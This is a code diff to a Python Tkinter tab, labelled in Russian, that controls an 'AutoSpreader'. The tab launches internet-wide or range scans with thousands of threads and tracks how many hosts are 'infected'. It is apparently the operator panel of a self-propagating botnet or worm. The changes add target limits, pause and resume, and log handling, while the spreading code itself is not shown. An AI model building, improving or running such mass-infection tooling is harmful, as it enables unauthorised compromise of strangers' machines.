@@ -9,6 +9,7 @@ class BotScanTab(tk.Frame):
     def __init__(self, parent):
         super().__init__(parent)
         self.spreader = AutoSpreader()
+        self.scanning = False
         self.build_ui()
 
     def build_ui(self):
@@ -24,14 +25,25 @@ class BotScanTab(tk.Frame):
         self.scan_threads.grid(row=1, column=1, padx=5, sticky=tk.W)
         self.scan_threads.insert(0, "2000")
         add_copy_paste_support(self.scan_threads)
+        ttk.Label(settings_frame, text="Макс. целей:").grid(row=2, column=0, padx=5, sticky=tk.W)
+        self.max_targets_entry = ttk.Entry(settings_frame, width=10)
+        self.max_targets_entry.grid(row=2, column=1, padx=5, sticky=tk.W)
+        self.max_targets_entry.insert(0, "5000")
+        add_copy_paste_support(self.max_targets_entry)
         
         btn_frame = ttk.Frame(self)
         btn_frame.pack(fill=tk.X, padx=5, pady=5)
-        ttk.Button(btn_frame, text="Сканировать интернет", command=self.scan_internet).pack(side=tk.LEFT, padx=2)
-        ttk.Button(btn_frame, text="Сканировать диапазон", command=self.scan_range).pack(side=tk.LEFT, padx=2)
-        ttk.Button(btn_frame, text="Остановить", command=self.stop_scan).pack(side=tk.LEFT, padx=2)
+        self.internet_btn = ttk.Button(btn_frame, text="Сканировать интернет", command=self.scan_internet)
+        self.internet_btn.pack(side=tk.LEFT, padx=2)
+        self.range_btn = ttk.Button(btn_frame, text="Сканировать диапазон", command=self.scan_range)
+        self.range_btn.pack(side=tk.LEFT, padx=2)
+        self.pause_btn = ttk.Button(btn_frame, text="Пауза", command=self.toggle_pause, state=tk.DISABLED)
+        self.pause_btn.pack(side=tk.LEFT, padx=2)
+        self.stop_btn = ttk.Button(btn_frame, text="Остановить", command=self.stop_scan)
+        self.stop_btn.pack(side=tk.LEFT, padx=2)
         ttk.Button(btn_frame, text="Копировать лог", command=self.copy_log).pack(side=tk.LEFT, padx=2)
         ttk.Button(btn_frame, text="Сохранить лог", command=self.save_log).pack(side=tk.LEFT, padx=2)
+        ttk.Button(btn_frame, text="Очистить лог", command=self.clear_log).pack(side=tk.LEFT, padx=2)
         
         stats_frame = ttk.Frame(self)
         stats_frame.pack(fill=tk.X, padx=5, pady=2)
@@ -77,6 +89,26 @@ class BotScanTab(tk.Frame):
         if infected is not None:
             self.infected_label.config(text=f"Заражено: {infected}")
 
+    def set_scanning_state(self, active):
+        self.scanning = active
+        state = tk.DISABLED if active else tk.NORMAL
+        self.internet_btn.config(state=state)
+        self.range_btn.config(state=state)
+        self.pause_btn.config(state=tk.NORMAL if active else tk.DISABLED)
+
+    def toggle_pause(self):
+        if self.spreader.paused:
+            self.spreader.resume()
+            self.pause_btn.config(text="Пауза")
+            self.log_to_scan("[Сканирование] Возобновлено")
+        else:
+            self.spreader.pause()
+            self.pause_btn.config(text="Продолжить")
+            self.log_to_scan("[Сканирование] Приостановлено")
+
+    def clear_log(self):
+        self.scan_log.delete(1.0, tk.END)
+
     def copy_log(self):
         self.clipboard_clear()
         self.clipboard_append(self.scan_log.get(1.0, tk.END))
@@ -96,22 +128,17 @@ class BotScanTab(tk.Frame):
                 if msg.startswith("[IP]"):
                     ip = msg[4:].strip()
                     self.log_to_scan(f"Сканируется {ip}", ip=ip)
-                elif msg.startswith("[Stats]") or msg.startswith("[Live]"):
-                    # Парсим числа
+                elif msg.startswith("[Stats]") or msg.startswith("[Live]") or msg.startswith("[Scan]"):
                     parts = msg.split(',')
                     scanned = None
                     infected = None
                     for part in parts:
                         if 'Просканировано:' in part:
-                            try:
-                                scanned = int(part.split(':')[1].strip())
-                            except:
-                                pass
+                            try: scanned = int(part.split(':')[1].strip())
+                            except: pass
                         if 'Заражено:' in part:
-                            try:
-                                infected = int(part.split(':')[1].strip())
-                            except:
-                                pass
+                            try: infected = int(part.split(':')[1].strip())
+                            except: pass
                     self.update_stats_display(scanned=scanned, infected=infected)
                     self.log_to_scan(msg)
                 elif msg.startswith("[Progress]"):
@@ -119,6 +146,9 @@ class BotScanTab(tk.Frame):
                         pct = int(msg.split("(")[1].split("%")[0])
                         self.progress_var.set(pct)
                     except: pass
+                elif msg == "[System] Стоп. Заражено:":
+                    self.set_scanning_state(False)
+                    self.log_to_scan(msg)
                 else:
                     self.log_to_scan(msg)
         except queue.Empty:
@@ -130,10 +160,13 @@ class BotScanTab(tk.Frame):
         self.spreader.load_settings("avz_settings.json")
         self.spreader.worker_threads = int(self.scan_threads.get())
         self.spreader.interval = 0
+        self.spreader.max_targets = int(self.max_targets_entry.get())
         self.progress_var.set(0)
         self.update_stats_display(scanned=0, infected=0)
+        self.clear_log()
         self.log_to_scan("Запущено глобальное сканирование")
         threading.Thread(target=self.spreader.start, daemon=True).start()
+        self.set_scanning_state(True)
 
     def scan_range(self):
         target = self.scan_target.get()
@@ -147,10 +180,13 @@ class BotScanTab(tk.Frame):
                 return
         else:
             targets = [target]
+        self.spreader.max_targets = len(targets)
         self.progress_var.set(0)
         self.update_stats_display(scanned=0, infected=0)
+        self.clear_log()
         self.log_to_scan(f"Сканирование диапазона {target} ({len(targets)} адресов)")
         self.spreader.scan_once(targets)
+        self.set_scanning_state(True)
 
     def stop_scan(self):
         self.spreader.stop()
@@ -160,3 +196,4 @@ class BotScanTab(tk.Frame):
         with open(filename, 'w') as f:
             f.write(self.scan_log.get(1.0, tk.END))
         self.log_to_scan(f"[Auto] Лог сохранён: {filename}")
+        self.set_scanning_state(False)
